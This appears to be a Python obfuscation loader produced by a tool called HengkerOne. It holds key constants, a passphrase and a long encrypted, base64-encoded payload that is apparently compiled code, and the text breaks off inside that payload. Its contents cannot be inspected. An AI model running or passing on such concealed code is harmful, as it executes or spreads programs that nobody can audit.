# SECURE PYTHON RUNTIME LOADER - Generated by HengkerOne
import marshal
import sys
import hashlib
import base64
import builtins
import hmac
import os
import time
from cryptography.fernet import Fernet 
import binascii 

ITERATIONS = 600000
KEY_LEN = 44 
RANDOM_SALT_B64 = 'CX+Tbjo0NvDBxsI9uqhj5A=='
PASSPHRASE_B64 = 'SGVuZ2tlck9uZV9lUGhyYSRlVzF0aFJAbkQwbU51bWIzcloh' 
HMAC_KEY_DERIVATION_SALT = b'HMAC_SALT_FOR_INTEGRITY'
OBFUSCATED_FERNET_KEY_HEX = "cf37db7e1e547803ed6ff914fb2561c17f157916838ef255597282aceb4d6ca89247aa91a445158ce1878c22"
ENCRYPTED_DATA_B64 = "Z0FBQUFBQm81ajNVdFRBMVFzcVExMnMxNzgzbHlGTWd4NlhfWndjbmRLNjl5cXB6NUpHNkRVdnJYMGFuMkVUSEozUTcyT01pU043N1hQR1g4bjMtdWdsS0l2eEE4OFVOa0E2QWFHOGlFRGRPOFNub0RoR0poVFBmTFJxazJVZ2JHU0pTVmdQM2dEUnNzYWVnQXJCZ3haYXZLc0p3UzByTVU1djV6bWhLNVBPSDJ5QllDLWUtdFp6NWliWFlULU9COTJDMFJTWFZldmFhWldfNE9ncVE4TS1FQVZRdkk2c0tQX0s0M2o5QW93SkJQSTV6c2NLZzA1ODJGbVNzSkZSWThUeWVuLVk4bWd3NGIyYXkzZEkyTGZSbzhxZG8tSWlKR0dJLXAybGNaa0lHYW45ZlZ6LXhaS0tVa01YYWJHakgwdk40clFmYlB6d3RwdUgxWE0yZ1N3M1RVbmdvVnI3UzVva0w1SkJWT3I1RG9TWG1hb3dfQUtmRjVRc3JVTFc0cExaUVdJd2NmSUhRcEw5d2JPU3dPSGNTQW5yN2FHdXFYYmQtSEx6bHIzeTRUOWtiUlQ1UHo3VUwxaHMzQUhxUmdLMGxRbXVtVElmLU53TDBnZE94T0tDcXRTVHdOM2dQazZkNG1pZ3pPaGNzV3U0dUJJTFM5M1dXWGdEcnZJQ3NvU1JVTHdNckNvYWpKTkJyUGt3RkRoQXRsZUJKbHhvOEdwbDZmRER5XzdwX0FPa05xTHcyMUtrTTRpT3JORFFIRXlJTjNQQUVUSHU0cHRxbmJaYnZUaFAtcmNVZHVMQi1UMjBtY2I5M3lMYW9BelFsaW1pNm9tSTN5Q2NFak1iUnNqVko3OFlxWThjYmEwYkdTUlMwNG0tRFNNd281Nk1PSFB3dkctYW1OaUR1VmZZVjFISjBnSHV1MjBVTUpTdG9Eem1NbVNmSlJZRkxndUhyMzRBUjdDQXQ1Z3ZIS1h2M2JrYkRFTWVXT3BacUJFLWhaMnJRTUxXUTRmaTc1NmtCR1U0MDVvU2FaZVd2N2lBUEprVnV3aTQ3R3l0UW1sOFFPMHZUSGFndGxWRS13YW94bXVBUmVfckx1Z2I0UzJDVk1aZWlmLXFpMkMwUWk4eDFfWE1tMllZam9wOUdrWkFreVoxcHJVbjhTY0FaeVpxSE5yVlR3eW9jZ2hhNy16d3l2b2kxOEhOOXZZQWhDVWczd21ucFE5Ym5fa2dURjd0UmtOcDNWNlRJRUNUamlZN2JGMXN0OFRERmhqYlRndm52Ti12dXlKdnl1UU1rT0VESE5qV1lGVl9kRUJ3VmRPdVo1SGx5ZDlpWmlWX1YzalJsODZRRXBHZlRGX3YtWGgtejVvN2E5dHlZMHBNb0RvY3Y2VXVDLU5LVjk4X2RfaTczTWtkOEc2d2k3bjV4dVhrRUlkZlN5TkFrVi1DOG1KY210N2tuSlhWb0loOWhuUjUwWlNld3lsMHBnUWhQNEhueHhRUkk2UldwVzNORWRmcFVqbVIwelBmWldVYVFaUTdKT1FibUZXdnp2TWpQZzZURXJLOHdhcVRFVlBqV1VfWTNPWXB1VHJqZ201SFY3eWpGNWlVbUFNWFZVQXkxSUM0Tk4xWGpiZ1BFX0QzYXZybS11RE41LU9tWTc5UUtsVG1GOTNTU290dnNmejh4VjRYUVlXWU9MNHJMNDNXZFZaTkQ5VE9od0l6YmpqbzB1d2FaR2ZuT1lTY2IyNFJYYzg0REhIYmNPQWJRTlM3S2xBaWgzQWxvNFF5WTFWMEJOSWNJek5IR1JCOVRoYzkzMlAtRTFFcjhyYldoTG1tQnlaSWtjLVloWEI2MjVHMDY0ZTNQZjRjQjJ0Q0R3YXRueFIzMUJ2dHlRUTNBQUFhaG5lT2hEQkU2ZmVMUTZzWTEyWllpM21RTGdJaXFjaTA4NnQ1OVAtLU5rNFJLSGNlaDF4SVQ0VUljc3FmWTJNcHJIOWcxZk9fOUJlYzFoU1dvc20zQ2NoOEpORzk1YVVXWnIyV3BoX2FFTzRJU2FXTWFaNm1JZTZCSk11SzBveldpazhmU2xwU0pyal9nYldjd1k0MVJkSnJqNWR2M1JIM2NwTXFhLUhpdUhfVC16MEhCTlUxQVI0bUxWcDc5VkM4bVhDTjJ1Sm5LZmZaaHJheEFnekMtaWN4MkdWZjB1TEFfU3FkemY2R2VzZEdXblRiaG9vYy1ydDhwYm1EZnQ5bXdudU8tZi1fWGVhejFmOFI1V0VvQzFzQncza05pU0x1bTZFOWhmc0JYRXB3WG1Jc01ESGtSMUw1aDhsWGJTajUweXVSSGl4YWNUaU9HWTNiODFrcVZNN3hVU2Z0dHYyRkNMX0hhSktTQ0F4OGRlV3EtdUNDRGd0LW5hYm5iSGJYOFF3V1Y4WEJKM1VSdmhfY0V1NUl0TzRfUjJXekNlVUJPZmZiMERXUGFmMjE0bDc4SHVRM3ZIOVB2c3ptY3lLMDRraWxhUUF2ZEF4ZlQ5Z29KczJ3S1g3SFdhb2VseS0xMEw4X2oteG04ZnBqNEE5aGoxTkFEUWJKX3hITkFWZXNoZl9aM21Lam5HMzVkV0hrZUpHQmRWcFV4dk0yZ2EzWkdSb2ZBcl9yS0VUaG82bnVsOHFLUndXY0hacW1ITDI3UkZDOFk1bXNNS0laUVVWNDJqbjBrcEZuY2F4T2NyUUpLQnMwZ0V3dDdsTm1Kcnl1bzhQMTlkTGhMNXZKWjdsUDNob3BKZDFSQ1laMzl5Sk10V0xTSVN0ZHlRNVRMY0dyWW00RVdkc0NWWndtbF9KQUNwRllYYlk3ODhGdHhzWFhJMTF6V1REV016b0VrVjJFSnpZWExlSkF3WEdnWWdyajFULWNMdFBGazVTWjUza1dZbWdwdENydUF3ZWNZVWxjSE5sMGJfU2w0a1YxeGc1NGlNN01xZnpPZzJEN3BMYkF3ZWpxc2hORmw1OTEyTlRsT0RZZkdEaERpRGkwNVFOQXVrcW5ZWm9mQ3BnVmFkNm5pak9hOUhPZGpiSHRndy1VMWRjeGRYZThlUzBhRWVTeHhubFhUVFk1ZUJ2UmlKaDNPU2VwdnZQTHYyQkRKT0gyUktJWVZScXBabVo1UDNjWFRXSnp5SnN4am1UUEgyM0pHM1JhWUVlTjViMU9WSS1yTW9JYmFURmRadjZjWmRWTjg2Q3NJMWtlSGNIUU1UTC1wYWl6R1g5dnNkQUdGT2ZxLTZzZGp2SEFRZDlfNnJENUgwMGRUVnBGTGtFNDdVMnRBNlY1dG5LU2dmZlVnc2laMVh5WVIwV01mLTJRcVB2bUM2NG1TRzA3LXo1MjF6TDU0TFdFaDBOWVJYU0NGU1Y5dmdhVXQwWTRVd3l3V1NfRHBsd1hXWTlsazZZOWsweVBSbmR4ajFMZHBubld1MmxES2RvWU5WN1A5eXcwRTFRTnhrSDZOOEFNUjlFUTRCUzJhQzF4anBTQm83MXo4bFBoLWc1cjN5S3VoTEFZQ18zMEtEQmpJNk9yekp1SkFxOV9QNjBZcm5PbG1ETkVydG9TaGZuMGVMWklyQS1iMEVLWkNBQXl2U1p4Tm55OTU4NWxMWFZqbnJ4bmNiMjNPMkVKby15VVE3WGxOQ1FtZ2NUZUE0bk83WlBDLVl2aWRYZG5wYndzX1NrZ3YwZHUyR2xzWXp2Q0tLbC1ldFZ4X2dqYjRQMGdfMlI2UUxjTHJzcFlNTnU2UUgyc0tuWWZibjdSem9qa0lqd1dxcFRCcnRKR2Q4cnBOMlhWd3dtR2R5RUhIbkNadS1ELVdGa1hQc3Zjdm03Y1JQdGppM1JxMUVieF9Kblp3dXAyeXRkVWpvTm5qQkl5NkVBWVZyTVpQRW5taUVSNURDRnV5SGFZMjRCMjhkc3lIWmhTeUhDbkpLQl9Bd21oNXV0Zkg1aHd4QzF0aGpDVUl0VjFPVWNtZFFVekdBX0otZmN2ZHppLWxFbG1TeXcxcU8xdC13STgxamhTQndTUk9saDFQWXBZQWRJaXlMRUFBSzF5THJMSEhCR1YwVENtVjFhVzBsMWt3RzR3by1rTEt6N1U1QlVSbWFsTE9DVmJXZkFuSzY4eXNWaDVkZzZGbVUtbTg2TXl3RkY3RkZ6dXhQd25VZ3ZvbU5zajVQbFJOb0RIb3NNcnhmRHdJemQxdUMxX1R4dnU5MzZlYUowZVlhNGg0WkZxNGUtTVBIOTFvVHJyVHVhUW1heFZ2aXZrU1dwd01TeE5zNnlEN0hRRWhJaTUwLVBHeUFyY0RtYl92Vk9vVkRPQ1Myby1kQ0ZNR3JEamNVd1k0TFZsbTRTYXBxTlZXZlJnMkVXWERwR2lBb0dNbUU3ajhaanc4cjBidmlxT1Ixcm1GV3BtUmdpeEQteTZmV2IxWDh5czFjT1RrOFBFazloSk5GeG5vME1BNXV4ODNCaTFCWHl4Qm52SC1seE5OSTRUMUdsamIxLXBhQV9FN3M3LVpycnFGN2ZYb0NyOTJNZGxlOUhXTUU4dGk2dV9rVFQ3R1lfNS1FeE0wQVE5VGlaWHdFZHJ4Y0hVQ3JUUHRhZVpaNVVPUmFjVWVSb2ZLTWotdXpwMnJPMUZ1dHhYSWVORXZ5bEtMcVV4QjFwOG9aMEh6RFA4TDlBSXVjYjVXQ3ZLZVFONHRwdVlhVTQ3SDlCelVMVjdEb1NFTExTbm43aXVLdmp4emVkN3Jfd0lTYzFsQWN0OGpQalNZWmR3bGluLTBFdlJoaDhOemRDMnNmLUxrbWYydUg5ZU9TSml4QV9ja1h2WUU3UWpxYzlzMURsdFdQdTZnUXBBdU54RXJzSmlnVG9YUkd3YlBZcWtleWI0eW1UNnI0dzVJWDZHZzVlazE3eVh3dUY3M2thSzU1dFNjeE5XUV95aHFKWTdEX1hBWk0xa3pyMjd0YS1NYnBiUm5uZlZjM0czcWZVU3VvWDJ4UVI2RXo4V3JIOXhaUlJRX0pYYjNlNDU3anpIY0VmeEtUdkszODgxZkRJTmluOVZieE5KT3ZWbHV5Z0JOMllaakdjRkRReWJuZWZDaGNMblVpT3c2emhKU3FqazhjMTlvdEZQS3VvWWtRaVpocWI4UWFSWlhMZU5aYjVJaGhmcHM2XzNPUEVFb3YtRlhFdWxkbWczSHZTV2wxdE1UY0k3V1Z5ZnVTUWU4TWIwNWZSWHo1T3UwSFVoSGFKUFgzTWhQUElzNmdFa2M3VXU4SmpsMW83YllxdHJ0SmVQalBMVWJfTFJHLU9GX1VSVFNCSW9nbGZJYjVfSGpZOGV0aXBEa0t6ODkxZ1c0cHhsUjlzU01YWmlhZTFkdWFXZ3BWakVZa3p0b21mR3RzNzJMcGdqOWpYckwyQ3F2allNaFVnS2c2V1NwOXdVLUtfaWhRazFzTnR1cF9MM3ZVenhwNEMwZml5bzJNdE9rdy0wLTRpZ21Cdk1jZjVqbXl5Z0d3WUZLamg2R2ZwQmt1V2R5bDJtcklNS1R4X2dJcV9tOUdIQmg3U3BmTjRfZ1FBdmYtVXJUN0JvdGVMOFlGN1BvckNTcXpocm4zcmhCN2wwbUtJcGxUUzdVN1pGcmtTeWNaNXdHclR0VkdWQWNzWUFmUXNYQlgxZDU5UWZWTDk4bEx5UlhneU9laW9VclN4aF9NVkdfbkRReE9jSlo5R0U3cVNvZmo0YzFwZVJPSHNSdFY4OVZBaVVWOEFIaG0ybG1sc1VJdzNmMGk1OXhaNDlFY21QUk9vWC1nNVFrUXEyTW85WDV4V0NHOHlEaklRY25uVDZNbjJvR19wZ1RzOG5pODZqWXFsRjQwLWFrRGRabmpkQk5PTzFmdmZjMXhJam5RYVZTb3d5SkJUWDZEOUVLTmJzcFZ3a3lsYjJEdEh2dTctOS1TOW5tOWJrVm1YS3duV2lOWmxiYXdaSjJDeTRXU2VEOVU0TDdWNkFqdk5WdV9IamlJTE1NanM3V01IS0N4V0owZ2dfTXVmOUpUcEdKZEM0X3d6cnNQUFZ6OTBKTGRYNkNuWHY4Qkd1akhuazFTa1pac1RzQUsyZEUtU3hPVzc2cGFzLXNyQUV3d0puLV9MUFNZWEVfYXoyaWhjc1dYNXBaYUM3ZlFMMFNCR2FYdEJlYUNYTGlFNHpHMzAwZWNJdm9udktDRzVyQVNIWlNVUF80U2FnZ0pCY2MwZ04walpiZ25jbF9kZFA0Wm1GRHJ1cFltazVnaVVQNnlnLV9zN1ZhZzRqOERFSDktWnBKT2VTbGxnelc5elZTb1RHRjkyNDZJVXhtSXhkLXRneDhKNGtmUHJCbTlDQXdBMEJHMkxadVY4QTl4OWY4RjQ5QVNlajFnckZZWjRDUEE2RWRCQk5YazJkRUtFdEhZYUg3Z3RqcnJ0ajJVWU9vbWFMek0zQ0szMHowOEpWc09VRENXLXVHdmd2NnR0N2xWcmxyaVpuVHFIdEdZU0x5dVZTRjlFenZ5d0NRX1N2cndaOFB0b1M0VjdCcXh1LVNxdEc0NlFUa1d1a1FyRHRGMnIyb3YtV2xkR05tRVBsRmtEd1lpYzBlRFcyRkp2RmZXT1VKTVVXLWhnZURLTkJpQ0E3VXBVbzBIQTZERFNEZ3lubTdMZnhmWXM0Nnk4QU1Jc25XcF93M2lXNzloUGZ5am1ONjMxRDA1WjI4S0NpeFVEd1JSQTJjMDR2ZDdUckNjLXJhLUhzSGJ4V2ptR21GMTNfWFdjcDZsYW5haWlobEk0Y2I5bUZmejZfZ01UVVBsZUhkZU15SVVua1pjRGUteVQtRTJNYzcyREY0eVk1aHViZ2JsenU2Qk5uLWFja2pDN1NLRzRJOEYwQVpCYnZBTEhzc3Zyell2REd4V1ZRczNQYTBZU3JHQXlOVEdfWThjWGJjQ3Q5enJCNDBZR0pySWRUNXBBNkw1bEVfb3pPRW1mTi1lWk5fcU9ocHk5NjBrNTFJc2xsaTlNMFJGNnEtT0E0dVR6eGhnV0Y0c3c1VzBkcGM3Y0l2LTB4d000b1ZxX1d2QWRWN0dpeGtnY1gzdTFDMFVHb3pqbTNULWNkQ2F2aHk4VXJPNlI4eVQ5a1Q0cEtYQWNjc2p4TzBPdFNSRlU1b0MzZ1llakcxMkVPUDJoWGFXRUJJWkczRGQ0SG5Lb2QzWVdpSlQtVDVST0dFNEY3bmRqeE9jbFU3d1d5c2NRQnduYmQwQnZmaUw1ZkdCU29YWXNHNWxVT3VSM2JxTWp3WHRQVzVLTlk4OXE0TnhRYWk5bjdTRGg4X2U3TG9sWThja0NBa213Q3VCU0k4b2dDcUtTY3NJcWhZT2VsVEpJQ0xCZFBFZ1owWU5SUGFiTHdkZE5IT0lJR1g2bzI0UVNRd3Y2NmxRcGlnZFNlUTh3Y21jSnpFVzFfSzlrOE5YTjNONUh2SXBRNTctWWU0My1lZjlaNGRqQW9heGM0UWo2ZmpUU0ZlUzkwX3RRQjE2blpvYmJOc1RWU3JpQ2R5LXduNXVUM3lfNjNDWHVSQzkyYlJZVTM1UTRkR09IYUVZZU1KUDlEUVNfZGJrVEVpVlU4R3E2WEpZczFoci1FZ01NNEVfeW1idVBETHNvcDVpU3hhQnBiYXpER3pZN2dVTmJWdGNOTGF3NkxVa2FfUHNhLXVESkp3WGU4b0NxNlVTbTYxQm1rR1U3SFBmeG1CT2dla0dnM1hWdW5ES0pHQW9WVUhiTmVFSGcyMGN6aDJXSl9Ja2hITC04NXRDdVlrQ3ZlOS1kaEVkTUpNLXJXNXVmM24zSDUwMjhsajRjVWw2cVhwY2JUaTY1VkhRdnM4REdHZ3dVT1puTGtiM1k2Qzk1OFZPNF8tbGVYSmhoZUhYQks0TVY1YXBzRm5md1puUUdWMnI5Y21nX2htaUprdU4xMHUwdmMxeVJEdUM1bE9sUWszVlBBWFVmYVpGUHJHYTdzak5ra3V1cC1TUWMtTkFaekNDeWZYMUYyN1JhdG90cjhmeGU1bUw0RVowMkZ6eEVWc2o4ZS1jal82SENrbDNwOGJ5TDdMVE1ROVRWdkFLbUw3dkZfWEVNZ3hWZEtIdjdCV0ZibllNNHBjQzVZYXROM09vbXJOTXJYRm8wRFFBdmRKMkhZN2tiZi1PM0lPUGVMWW51TG4zZjdiYmNleXhZOWdDdlViaEIxUUpXX0FXUjdvalNET1M2MlFndWNfb2lwbjhTZU40YUpXNW1Nd1B4VWFINV9ya0FlcmVBRnI1YzN1TkcybjY2bmszLVAwOTBYdXN2NU15SThTZEpNTlVVNXJSdFIwNl9tZFlfVG05WUl6by1TVENLR25DZ2trMzlLeWJwMW16Uk1MeVdRblYwcHJGVHlfTFFQTjdHS2h4V1Y1TFpkcnRMbkp5RThQbVV3YUREWk9ZWTdtN0x0b1FiajRocEVuZkhDcnpSNFBEbE9xZFhSUmhXa1EzRVNQcTVrR1ZWYkUyS3VDM2FXUnlpcjVfcGxCSllmWUdsdTFGaWo3QlRBUGs2bE9lVHlodDZUN1lQX1d3RTNVWXQ3S0NSVlIzYzV6T29YRVJ6RHRBY3RjeDB1cFVzMllZSnptTHJSdjVQUjRRSk5BTkNuV0lVZ3dsTGxZamN3QTdXM1kydTVNTHFOYi1lNnFGSmVjUEFSSVVNeE1HZWxVM0tTLWFvYkFQQWVMS0stTGI4RGNUb1BlcEl2aHZuN0dVM3Q2MXplYkRwSnFLWElCLTBtTWdmeUtwNUFzbG5GZEJqRVRELURoaDluTGRnZkJEd1VlVXpRODhtbzM2UFpVWFBkNEFTWmdDYnYxcnN5WnFEU1hyU2JqMmtGR1NwLTZLMFlqYkVWM0g2ZVRSamU4bWFDYk1LTWdPaHgtaE9NeE5jYmQ2ZWstNTRZX0lhWDE4UUZ6RUZVTm5YX3dBM05xY3RCQkZsd3h3aE1OdnZzSHVYbm96VmtHZDNTLUtfMmZfU3JDRDlKWG9Xd3NOYlR4X2o0VEdLSzBOeDVHemRLQXUwVWIzR2R1LVBnZ3Btd2RDRzhEYnM3dFRKeEUtTnE5WXNCZHBlVWVubW9mbUxGdDhwUzlJSkpSbi12V3c1aEJTaFdBS0xzdDhNT3FvbFBzS2Zrdk9GVjhlNkJKOHl6LUlpVG5qei1wOWtiWWE1ZjhXZ3d2bklabXlMQVc5b2ViejBoWXMxT1M3SlFMVFB0eWFlSXU3NDBMalBrMEt3UjdRVFpwTGtlbXJJUGozSE5VX1MzSGVGSF9iSTU5OGh2Z1cxbFY3VF9RbFZ1Z0xlazQxM1czc2ZXdGo3cTIwN18wdUxsV2ZUaVUtWkVSVlFJOUZXTlFkSzhxeVFpNUVhRWZvWU8wNHZuRExkekw5Tm9MZTRoX2ZBQUNMLUMxYmxueThWWENINUNSdHVPS0E4UXBDcThxTVl4Zl9RaW55Y2NHQ2RrX2pBYzRiVE44blc1Z2l3RTR2MU5QRnJySmEtRnc4ek9mUWpWakc2ZGRhYnpzQkZYcVRQYnNHa1ZuV1pKRndfR2M4T2luRTR6ZElhZmxDY0FRSVNiQWlfV0cyaGdDOEpkV0lKZGcyNEdJRVRoc0VEbnF3Ti0yR0NZcWRxTVFkWFE4Yk5tLS0wZ0dTU282VjJNcmt0amtkYmIzTTRkN0JTT0dLZURDX1FzSFhMTGpySUpfRmcwS3p0NVprNzYxQ0htQ0t0RGRBSlVfU3JocnZoakwyRTBwYVV0c1hIVWx2NTh2ZlkwajFRb2psdmhQdGF6d191Zm5MdEhsdXptUXdlVFUweHNQcTN4Zll5cVhwTDRnZUJBdjFBTTc4WDhjeUZITjVzamZpdEQzSmhUZ1NVOG5wX0dQT0pPUTk4dFNpR3lCOF81SjNGVzB1RzNsMDFtbnRYMWpQTmlIVGZ2V01ZTnVOVElGRHQ3N2k5eUFjc0FJc3pSRmRQdENGSkFQc0I0MWhRaDJ5WWxhdlA1UWFGRi01MVRwUkl5ZmI1VjlGdFZoRDBmQ28tYWdaZ1diMXB3S054X2N5emlVb1BSMExDLS1lVTR1SHNyN3RRT2VwSzJFWk90OTMyVnZHTGlCVU9TSmdYNVBKWVpxekVrLVlSUjZCSnZSU19SNUhObzMtZVFkUXNiNEpHWlRNYUJUTzhVQTFjVEJ1cmNjeDUwNk5aWWc1Yml5MHViR1poQXpVX19vUnR4YV80bmVURlhMODRMM1V4V0FyTnhlOW5BaF85VndiSS10QkZnQmNQMno2NUJ3b3pkZGhRLUM5NkR2eTRTOVFmWmhhLXlqS0VGemMyMTQ4QTR3eVNpV0RwQmlQTzB1VnljYWpqaVpLR0pGUExWYk5FdE1ZS2tCNVRfQXc4emhRTGh3RUV1czNBYmVhdXpURUlPeUdrUWNzVFdVR1JDb2pvRjVVaTJVOHRCclNzUnRGb0tZVVk4aGFBd2JZTnpCNF9Qa2F5SUdRN2JSUmFfRGdEY2MyNmFSdjRVN2Vrb0hSWEI1cXlqMmJIckQ4QW9ycTB6bnBMOW5yb1BROGdiV19HYVA1M1BlVzl0WG02bXpieWJxN0ppVE4xMXZCMlZpT1k0VGRnMHk5bGtzcmVQZ1hhYlpsbzJaVHRaRU5JQ2JueXdYejMyajQ3ZHpyc3ZYWjFNend0SE1HYU1odE5zcUtoRXVWcGRnMTdTZnlMbkNSWnotMnJVNjFycHJ6SklHNzJKU3dvQi1idjRfRW9DTHp5eXlHb0EwWWtSSEZhRUtnd21jbTVMd1o4X3Zma25TVHM5TmljM2JQc0gtNEl1aFNMYzVkVktwTmo4TkhpbUpuR0U5RnlIVW02UTNYdHZvSTNmSmRWelVQVXdfbzRDWHFEMmVUZVF6WmQxN19YbmpNNUhIOFRYQ0FCQ09uUERQOUxUbDlZWXpCaGtvLV94S0FSSjB6a0dheWNlUjFyWlU3Z0dkMjNrWkZJanFVT1BQNDFFWlBUX25CWWd2TkhEQWVya0wwbUlOQkwzNHpCS2NZM0JrQTJTY0lDMG81dUYwc2pSNFUtLXdkQzI0TENzZ3NQRUxXR2hoZVRKbS1xcG4xTVhZV0p1OXlITzNKaFZDY1dNNTA2cDR3TWJhdThBWHpJZ2ZLdEJxdkNzRUVFRWNjbFU2d0J6RVhjQjVmdjdFZjdqRS13QWxJS3N6a2lBcHpuMV81Vldrak81dGVxY2EySmtNYzB5eFRYanFSaXVwcmlOSWF0VEU3VklZVXcxQVVGSmR5eFgwcVFHYnZsS0xNMHh5S1YzY0FmU0c2bHdwaElzU3h5NGVDMUM4QVhJSUVwTFc5Q3pCLTVxV09PSndQY21VdjRjc20zdmVPX3BuMEhBNDJoZmhSSTItU1hwY2g5ZWI1TGdJUVFudTVNdWZmWURISWROcG9kVEVYazMzei0yVjVJYUVJNEloNkF1QXk1YTZDTExQQVR1MWF2WEJSSTVPWEZsaUdXQlhuUWV3TjQtQUE3cjNOSnFhMDNZMkViaVR4U2o4WE55TGpYblp0TXExUkc0UEdHM2dsUG12Um1Kc2RqRmJlUlRxYlJWVFR4bGZmQ2ZSRzFKc2V6SVlyZUZQM3RRTmpqUjJXYXVnUmktc1ZaYzhmTVZHZEp1dEhTd0VOa1dUVXZFX1NqY1VodXNEUzJKWWdTa1dtMUh0d0xJWEtPN1Q1VnpIRUFVMGxlRE1zYlU5TnRERVQ5MUhCQ3B0UldNUDRJMlpUSl94c1pkRWZQeWxjZEpsTnRwYVZiaHQ4WVVGRy1KcVFVM3oxOFFBMGtPTm1YbDFSNGNtclBPYW9OUFE5TFY2bTZ0N3MzZU9zUngtc1BheWdTdmZGbnNFT1gtSkdZUEFYemF5cW9udGZvRVVZeXgtVEVrSkdDcUdyVVBGMVFMdC1CWXBKdTVpdkNDb0RnQmc1ek1KdGdEQWh6VkdhX2MxVENvamJJaXVYQWZFZjR5RVN2ZG5fNldvRU5abFB6bkFiZDJLMHhHSjRQZXFqNnBRSF9kWk9SanYyRGw3eUVfeUxrNllTNE5MdVgwQUVNUm0weHBsNkNDZm1wSVVZOTBGV1lXYjRyQWRWOHhhQmZST0otOEpXUFlzVjB5YkpXSW5rU3BJUGpvNVJFTU56ZjVDNFM3V2pPR293OTVjdGlHTTNzRk1rZEN2QjJaa1ItbUctaFB6UzUxWjZLYl9FLW9SNm1RLVdjTnNpY2ZTSGpJSGhaT2Vyb2JHWFFtc282ZVBGQjRqWWJfNVdPaTZyMW9pLUVfUU5XNUZIbGlndWVWdXp1QllhNHRKVURZZE1HM2dEMk1wS3FzdzJhaEgxUFBkMjBldV9Rc3kxdkp2US1lWFNUamoxQnpLLTdadTJIQ0kwaDdlQUpOZERTRDF3aG5jQXptcGtNbVhfbWh4bjdUUXN2clA2eUZBNWJWS0dhc0VTMzR6WThlS05nLUJZaS1Hby1QR2x2Q0JsNlVLX3VxOF9Ob3VfYWh6cFVseXdjS251YjJuOEs3ay1JQXNkQjdCT2lKa1BFZUVpZmgzclFpUUtqLVk4WmI0bnJQd1htZ3V3UmJCSDYxT1V0VnkzRld6TnBDaGdkeDNsalJTZFB0RHpnUWZXbDMwU1phWEFlVWdkb19OcW12VExDcUI0VmdzNVFRd2tpeHFqVEc4WUtyTUJVcTMzZnlOYzd2MjliOHpfRWNGR0kzSHd3a21pRy1rMkdPWldnNEFDVmpYNm9FMXBMNEY2VDU2TEpyUWtTOGlqTmhSTUxpUm52WTZ2QjZNa3Y5M3M1Mzg3SExuTl9iNVVMOXNfYXJ2SnFLcFhqR0xuaVVJOUU4M0VSSE5BZUN3YlRERHhYVHdiaDlUbWhEUHJHRml6MUdmWDhtelpuVjd5Qmk0bnR2YWlGZWI2dloxTDh6OGFRcmFEWklscDZwWF9QeDJ2R3huLXFrVGlOaHFUOUVCbkdTYjJDVHVpaDc4bmN6TFA5Mi1FNU9WeE1JaTEwUmZHVmpjYXlpanBJM0o3NVdHU1BkaE5fZ01nWUNMdmlGc1FLZmFHVm1BRGRhQkMtdkdWaXRHN01FdUNzLXZMME5KYkJsR2hHZmh6X3lTX0FHd0I4UVdxYWlGZUtpbGVSOFRVUGFQWHg2cVJCeGs3RE9oNE91R3lIQ21jc2U3em1EUEJpYTA4OVI0Ym9wTlFUczVJWXltRURObm5MaVRzUDdIQ25LRFZCN2p6OFVfMExESzllb3RVN3A4YXZfQk5DYkRFZkgxaURYMlYzckZkZV80S1doZXF2MTdPNnpkSVZtUFdUdWR0ZXg5NVdIbWwwY3BnZ2dWSTFZOF9oYmpHajRrZkhxNmN0NndrVDVRRnlmNWt4WGdlVzFhbS1pX1gwdlJBS3BkM1JUMTY2UHNvQVlKXzNVUWxzemRTN2U3cURiRDJFX1RkanRCT1VYQUZRX3UxcVBZWFZUV2xmQldxRFVlVnJOZzRNaktDWjR1eFZLeEpHNkNtNVd3TXNkSF9yZTNZZXZnVnpQSkdUNE05WUFpcjNPYjdZbG1nODRLT2F2ZzcyQkNQTzVTLUt6RTRmUXBlbFRhNzkxUTBmX0o3YW5OSGhDTDN6cWN1OUJLcVFDbnZnajRhYWp6VGJmWk5Ea2lhb3ljSmlGeXFFUjJ6cEI0NnRDek1WUUMzbGJMdmpvRW1WbXFoU1lPWE93UjItRjJYaGZXYkJQWWM4Wi1PXzFDb3ZtOXIwenJXT1BEUkE5QWMxOXczZXF6d2hWMTRPT0NheTFsbmhJcU5reC1PSnJIbFI3SGhGZVE1WXlob1NaMkh2eFNDcW9rdzFpeVhnMEV0aGZabzVvcmpSN2stRnFnZW5lNTN0M2stODU2MUJ3VjJnV3VES3d0UGFvQ2tUTmxKRzFHZWtYeGczbVA4OElfdzZjRVB6SEZCUGdCWlFVajBhODNoaWQ1eVc0cWxUYm9xYXpUeXpKd0lrejIxTW4xTXd4ZFpMS1hjY2pfa0lvSEdYMHQtMGh5LUloSS1XR1RJb2lQZlNKRWt3bDZYazFfMHA0TjBwbnZ3Y0JIc3I0WmFvaDNtN2VfN0o5MWMxSWpVNlhlSlBYWW5FZTNmQTB2STNXWmxDNzBGbEs1Y0tqRDN6SGdWaHFYanJXN2hVVXdiNTZEbXdPX09DbEwyamJMck1KdmFLSURPWW9VMlpZc3F1d0NPNnlJcTBNQ3hnRWNJQ0pwRjZFN242cU01U00zOTFPRnM5bTRlbXRzZTAyc2pKYXZPcXZvV1czamZycW00dWFXUExiMmZuUUszNE5XOTROQ280WkpqOGI0UEE4UUM0X3NMcF83UllfTTZuS2FkQUtOZVB3STRoN0tiVXFQN3puX19tOE9nTGVPeExTNXhlTzhnNUVfUUFRaDlxTFc3R0cxaUF0ZlFUWU9STExycHdCYzcxYTcwZ0hpVHBXZjdiNU9PSjB2aTNmaThwbFdBY043OTRvWGJKazMwRGZtMDJURURaLW9kbmFBR3VZQk8tZVhpbFpfZWVUZ2xNM2RyakxKdmMzR0Z5VEJ4SllzaUtQLTRUWkpVaVFMdUVLN0lhamloMFVEQVBVZmpRRmRiWG1qcTZHM0k1RGpDUWtnX3B4TjBRaWp1ZEtMWEpaLXduNzU1QXZNeG0xYWNCLUZtX0Q5eFdNSGhSV3hkM3IzOU1ZNElXRU8tcjU4Q25QR0oxNTJwRHphSG9Qa1cyYy1uR180bkIya0t1TWJnbFdENWNWalFkWm43dkpzUVp2ME9ES3ppV1VmbEhBcUd1VWVSaVVNbmowakV0MXhvdXhkME5LZzdfU0JIbVh5bzhoNTctYVV3MUcxN3NxalBqYk4tSDY1Uko2ZGkxUUJUQjZlN29WYzctV2pBUVlVOVBHUlYtNkNXc3h2dXA2SXVqVUVTOTQwWnN6emE2czRXQllYNDVpWFlUOFlPc0trQ1J6eVRTVkM3cmhoQ2N6ZWZ6T1kzXzJkbHBNbUV6WWgzSll1UE9IWHRBVFJPRWN5aF9yM2dkQ0poT05pMU1TSmU2OFdKWk94dUJXbnBDOFh0N2d2YkZCNEtJbDh3Rl9zNl85enN3ejJZVVFVZmlQVDZCaW